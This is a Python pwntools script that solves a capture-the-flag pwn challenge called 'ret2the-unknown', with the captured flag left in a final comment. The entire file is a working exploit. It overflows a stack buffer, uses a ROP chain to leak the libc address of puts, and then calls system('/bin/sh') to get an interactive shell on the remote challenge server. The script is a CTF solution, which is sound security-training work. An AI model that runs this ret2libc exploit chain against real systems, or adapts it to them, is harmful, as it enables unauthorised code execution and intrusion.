#!/usr/bin/env python3

from Crypto.Util.number import bytes_to_long
from pwn import *
from time import sleep

commands = '''
b main
c
# gets
b *0x004011f9
# ret
0x00401237
'''
if len(sys.argv) > 1 and sys.argv[1] == 'debug':
    r = gdb.debug(['./ret2the-unknown'], commands)
elif len(sys.argv) > 1 and sys.argv[1] == 'local':
    r = process('./ret2the-unknown')
else:
    r = remote('mc.ax', 31568)

elf = ELF('./ret2the-unknown')
libc = ELF('./libc-2.28.so')

pop_rdi = 0x4012a3
puts_got = elf.got['puts']
puts_plt = elf.plt['puts']
main = elf.sym['main']

pad = b'A' * 32
pad += p64(elf.sym['main'])

pld = pad
pld += p64(pop_rdi)
pld += p64(puts_got)
pld += p64(puts_plt)
pld += p64(main)

r.recv()
r.sendline(pld)
sleep(1)
leak = bytes_to_long(r.recv().splitlines()[3][::-1])

base = leak - libc.sym['puts']
binsh = base + next(libc.search(b'/bin/sh'))
system = base + libc.sym['system']

log.info(f'base = {hex(base)}')
log.info(f'leak = {hex(leak)}')
log.info(f'binsh = {hex(binsh)}')
log.info(f'system = {hex(system)}')

rop = pad
rop += p64(pop_rdi)
rop += p64(binsh)
rop += p64(system)

r.sendline(rop)

r.interactive()

# flag{rob-is-proud-of-me-for-exploring-the-unknown-but-i-still-cant-afford-housing}
